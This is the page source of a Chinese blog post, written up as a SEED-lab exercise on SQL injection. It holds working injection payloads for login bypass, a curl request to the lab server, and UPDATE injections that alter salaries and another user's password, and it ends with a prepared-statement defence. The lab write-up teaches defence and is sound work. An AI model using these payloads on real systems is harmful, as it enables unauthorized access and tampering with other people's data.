@@ -1,0 +1,867 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
+  <link rel="icon" href="/image/atom1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#153b6e">
+  <meta name="author" content="郭佳明">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SQL 注入原理下图可以很好的表示SQL注入，车牌被识别后，系统会执行drop database指令删除数据库  下面的漫画中，该学生的姓名为“Robert’); DROP TABLE students;–”，导致students表被删除：  在输入的字符串之中注入SQL指令，恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，遭到破坏或是入侵 例如，某个网站的登录验证的SQL查询代码为 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SEED-lab：SQL Injection Attack Lab">
+<meta property="og:url" content="http://gls.show/p/961c048e/index.html">
+<meta property="og:site_name" content="郭佳明的博客">
+<meta property="og:description" content="SQL 注入原理下图可以很好的表示SQL注入，车牌被识别后，系统会执行drop database指令删除数据库  下面的漫画中，该学生的姓名为“Robert’); DROP TABLE students;–”，导致students表被删除：  在输入的字符串之中注入SQL指令，恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，遭到破坏或是入侵 例如，某个网站的登录验证的SQL查询代码为 1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gls.show/image/Security_SQL-Injection_1.png">
+<meta property="article:published_time" content="2022-10-09T02:38:07.793Z">
+<meta property="article:modified_time" content="2023-03-26T15:52:05.034Z">
+<meta property="article:author" content="郭佳明">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://gls.show/image/Security_SQL-Injection_1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SEED-lab：SQL Injection Attack Lab - 郭佳明的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>郭佳明的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SEED-lab：SQL Injection Attack Lab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-09 10:38" pubdate>
+          2022年10月9日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          4.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SEED-lab：SQL Injection Attack Lab</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2023年3月26日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="SQL-注入原理"><a href="#SQL-注入原理" class="headerlink" title="SQL 注入原理"></a>SQL 注入原理</h1><p>下图可以很好的表示SQL注入，车牌被识别后，系统会执行drop database指令删除数据库</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ec8ce91818ae7d3080bdeb55586a55a5.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>下面的漫画中，该学生的姓名为“Robert’); DROP TABLE students;–”，导致students表被删除：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5c3cc846a007cb39ab09a6b88c7526ba.png" srcset="/img/loading.gif" lazyload></p>
+<p>在输入的字符串之中注入SQL指令，恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，遭到破坏或是入侵</p>
+<p>例如，某个网站的登录验证的SQL查询代码为</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">strSQL = <span class="hljs-string">&quot;SELECT * FROM users WHERE (name = &#x27;&quot;</span> + userName + <span class="hljs-string">&quot;&#x27;) and (pw = &#x27;&quot;</span>+ passWord +<span class="hljs-string">&quot;&#x27;);&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>恶意填入</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">userName = <span class="hljs-string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>与</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">passWord = <span class="hljs-string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>时，将导致原本的SQL字符串被填为</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">strSQL = <span class="hljs-string">&quot;SELECT * FROM users WHERE (name = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;) and (pw = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;);&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>实际上运行的SQL命令会变成下面这样的</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">strSQL = <span class="hljs-string">&quot;SELECT * FROM users;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>从而达到无账号密码登录网站。所以SQL注入被俗称为<strong>黑客的填空游戏。</strong></p>
+<h2 id="SQL-Injection中的特殊字符：单引号-39-39-与井号"><a href="#SQL-Injection中的特殊字符：单引号-39-39-与井号" class="headerlink" title="SQL Injection中的特殊字符：单引号&#39;&#39;与井号#"></a>SQL Injection中的特殊字符：单引号<code>&#39;&#39;</code>与井号<code>#</code></h2><p>输入数据两端都会被加上引号<code>&#39;&#39;</code>作为SQL语句的一部分</p>
+<p>比如，下面是一个输入窗口：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/44fb127eee93184340f3ad7cc69800ad.png" srcset="/img/loading.gif" lazyload></p>
+<p>实际上它的形式：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f321fe94d6da7e76b09bd1fa44299434.png" srcset="/img/loading.gif" lazyload></p>
+<p>假若输入数据分别为：<code>EID5002&#39;  #&#39;</code>   和  <code>xyz</code></p>
+<p>则对应的SQL语句为：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5fdd2ba79ece2a43aeaf8023f852a8bd.png" srcset="/img/loading.gif" lazyload alt="image-20210323081645971"></p>
+<p>可以看到<code>#</code>后的内容被注释</p>
+<p>因此，通过人为的输入<code>&#39;&#39;</code>和<code>#</code>，可以改变SQL语句的意义</p>
+<h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><ul>
+<li>下载实验文件，解压</li>
+<li>增加hosts映射</li>
+<li>运行docker</li>
+</ul>
+<h1 id="Task-1-Get-Familiar-with-SQL-Statements"><a href="#Task-1-Get-Familiar-with-SQL-Statements" class="headerlink" title="Task 1: Get Familiar with SQL Statements"></a>Task 1: Get Familiar with SQL Statements</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">docksh &lt;id&gt; #进入MySQL容器内部<br><br>mysql -u root -pdees # root身份进入数据库<br><br>use sqllab_users;#使用已创建的sqllab_users数据库<br><br>show tables;#显示table<br><br>select * from credential; # 打印出credential表全部信息<br><br>+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+<br>| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |<br>+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+<br>|  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |<br>|  2 | Boby  | 20000 |  30000 | 4/20  | 10213352 |             |         |       |          | b78ed97677c161c1c82c142906674ad15242b2d4 |<br>|  3 | Ryan  | 30000 |  50000 | 4/10  | 98993524 |             |         |       |          | a3c50276cb120637cca669eb38fb9928b017e9ef |<br>|  4 | Samy  | 40000 |  90000 | 1/11  | 32193525 |             |         |       |          | 995b8b8c183f349b3cab0ae7fccd39133508d2af |<br>|  5 | Ted   | 50000 | 110000 | 11/3  | 32111111 |             |         |       |          | 99343bff28a7bb51cb6f22cb20a618701a2c2f58 |<br>|  6 | Admin | 99999 | 400000 | 3/5   | 43254314 |             |         |       |          | a5bdf35a1df4ea895905f6f6618e83951a6effc0 |<br>+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+<br>6 rows in set (0.02 sec)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$input_uname</span> = <span class="hljs-variable">$_GET</span>[’username’];<br><span class="hljs-variable">$input_pwd</span> = <span class="hljs-variable">$_GET</span>[’Password’];<br><span class="hljs-variable">$hashed_pwd</span> = sha1(<span class="hljs-variable">$input_pwd</span>);<br>...<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT id, name, eid, salary, birth, ssn, address, email,</span><br><span class="hljs-string">nickname, Password</span><br><span class="hljs-string">FROM credential</span><br><span class="hljs-string">WHERE name= ’<span class="hljs-subst">$input_uname</span>’ and Password=’<span class="hljs-subst">$hashed_pwd</span>’&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span> -&gt; query(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>
+
+<p>可以看出$input_uname有注入漏洞</p>
+<h1 id="Task-2-SQL-Injection-Attack-on-SELECT-Statement"><a href="#Task-2-SQL-Injection-Attack-on-SELECT-Statement" class="headerlink" title="Task 2: SQL Injection Attack on SELECT Statement"></a>Task 2: SQL Injection Attack on SELECT Statement</h1><p><a target="_blank" rel="noopener" href="http://www.seed-server.com/">www.seed-server.com</a> 是我们要攻击的网站</p>
+<h2 id="Task-2-1-SQL-Injection-Attack-from-webpage"><a href="#Task-2-1-SQL-Injection-Attack-from-webpage" class="headerlink" title="Task 2.1: SQL Injection Attack from webpage."></a>Task 2.1: SQL Injection Attack from webpage.</h2><ul>
+<li>username：admin’#</li>
+<li>passwd：随意</li>
+</ul>
+<p>成功以admin身份进入</p>
+<h2 id="Task-2-2-SQL-Injection-Attack-from-command-line"><a href="#Task-2-2-SQL-Injection-Attack-from-command-line" class="headerlink" title="Task 2.2: SQL Injection Attack from command line."></a>Task 2.2: SQL Injection Attack from command line.</h2><p>在不使用网页的情况下完成上述2.1的注入，比如命令行的curl命令</p>
+<p>curl语句中要对一些字符进行编码，比如撇号、空格、井号，分别对应%27、%20、%23，详见<a target="_blank" rel="noopener" href="https://www.w3schools.com/tags/ref_urlencode.ASP">https://www.w3schools.com/tags/ref_urlencode.ASP</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &#x27;http://www.seed-server.com/unsafe_home.php?username=admin%27%23&#x27;<br></code></pre></td></tr></table></figure>
+<p>成功获取对应的网页源码</p>
+<h2 id="Task-2-3-Append-a-new-SQL-statement"><a href="#Task-2-3-Append-a-new-SQL-statement" class="headerlink" title="Task 2.3: Append a new SQL statement."></a>Task 2.3: Append a new SQL statement.</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;or Name=&#x27;</span><span class="hljs-keyword">Admin</span><span class="hljs-string">&#x27;;UPDATE credential  SET Salary = &#x27;</span><span class="hljs-number">88888</span><span class="hljs-string">&#x27; WHERE Name=&#x27;</span>Alic<span class="hljs-string">e&#x27;;# 在username中</span><br><span class="hljs-string"></span><br><span class="hljs-string">There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="hljs-keyword">UPDATE</span> credential <span class="hljs-keyword">SET</span> Salary = <span class="hljs-string">&#x27;88888&#x27;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-type">Name</span>=<span class="hljs-string">&#x27;Alice&#x27;</span>;#<span class="hljs-string">&#x27; and Password=&#x27;</span>da39<span class="hljs-string">&#x27; at line 3]\n</span><br></code></pre></td></tr></table></figure>
+<p>这说明分号前后被分割为两个语句</p>
+<h1 id="Task-3-SQL-Injection-Attack-on-UPDATE-Statement"><a href="#Task-3-SQL-Injection-Attack-on-UPDATE-Statement" class="headerlink" title="Task 3: SQL Injection Attack on UPDATE Statement"></a>Task 3: SQL Injection Attack on UPDATE Statement</h1><p>edit profile的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$hashed_pwd</span> = sha1(<span class="hljs-variable">$input_pwd</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE credential SET</span><br><span class="hljs-string">        nickname=’<span class="hljs-subst">$input_nickname</span>’,</span><br><span class="hljs-string">        email=’<span class="hljs-subst">$input_email</span>’,</span><br><span class="hljs-string">        address=’<span class="hljs-subst">$input_address</span>’,</span><br><span class="hljs-string">        Password=’<span class="hljs-subst">$hashed_pwd</span>’,</span><br><span class="hljs-string">        PhoneNumber=’<span class="hljs-subst">$input_phonenumber</span>’</span><br><span class="hljs-string">        WHERE ID=<span class="hljs-subst">$id</span>;&quot;</span>;<br><span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>
+<h2 id="Task-3-1-Modify-your-own-salary"><a href="#Task-3-1-Modify-your-own-salary" class="headerlink" title="Task 3.1: Modify your own salary."></a>Task 3.1: Modify your own salary.</h2><p>注入如下：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">&#x27;,Salary=&#x27;</span><span class="hljs-number">99999999&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Task-3-2-Modify-other-people’-salary"><a href="#Task-3-2-Modify-other-people’-salary" class="headerlink" title="Task 3.2: Modify other people’ salary."></a>Task 3.2: Modify other people’ salary.</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">&#x27;,salary=&#x27;</span><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">where</span> name=<span class="hljs-string">&#x27;Boby&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Task-3-3-Modify-other-people’-password"><a href="#Task-3-3-Modify-other-people’-password" class="headerlink" title="Task 3.3: Modify other people’ password."></a>Task 3.3: Modify other people’ password.</h2><p>先把nmsl转化为sha1，然后填入password字段方可通过nmsl登录成功</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;,password=&#x27;nmsl&#x27; <span class="hljs-keyword">where</span> <span class="hljs-built_in">name</span>=&#x27;Boby&#x27;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<h1 id="Task-4-Countermeasure-—-Prepared-Statement"><a href="#Task-4-Countermeasure-—-Prepared-Statement" class="headerlink" title="Task 4: Countermeasure — Prepared Statement"></a>Task 4: Countermeasure — Prepared Statement</h1><p>预防SQL注入的方法：使用预处理机制，实现代码与数据分离</p>
+<p>可以把原先代码通过预处理进行改写：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> = getDB();<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;SELECT name, local, gender</span><br><span class="hljs-string">FROM USER_TABLE</span><br><span class="hljs-string">WHERE id = ? and password = ? &quot;</span>);<br><span class="hljs-comment">// Bind parameters to the query</span><br><span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&quot;is&quot;</span>, <span class="hljs-variable">$id</span>, <span class="hljs-variable">$pwd</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$stmt</span>-&gt;bind_result(<span class="hljs-variable">$bind_name</span>, <span class="hljs-variable">$bind_local</span>, <span class="hljs-variable">$bind_gender</span>);<br><span class="hljs-variable">$stmt</span>-&gt;fetch();<br></code></pre></td></tr></table></figure>
+<p>在这里，我们将向数据库发送SQL语句的过程分为两个步骤</p>
+<ul>
+<li>仅发送代码部分，即不包含实际数据的SQL语句。这是准备步骤。从上面的代码片段可以看出，实际数据被问号？代替。</li>
+<li>使用bind param()将数据发送到数据库。数据库将在此步骤中发送的所有内容 <strong>仅视为数据，不再视为代码。</strong> 它将数据绑定到准备好的语句的相应问号。</li>
+</ul>
+<p>通过这种方式，我们将代码与数据做到了分离，从而防止了SQL注入的可能性</p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/SEED-lab/" class="category-chain-item">SEED-lab</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SEED-lab：SQL Injection Attack Lab</div>
+      <div>http://gls.show/p/961c048e/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>郭佳明</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年10月9日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/p/383dc23/" title="SEED-lab：RSA Public-Key Encryption and Signature Lab">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SEED-lab：RSA Public-Key Encryption and Signature Lab</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/p/cb388511/" title="SEED-lab：Cross-Site Request Forgery Attack Lab">
+                        <span class="hidden-mobile">SEED-lab：Cross-Site Request Forgery Attack Lab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'LaPhilosophie/gls.show');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
+</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP备2021035969号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
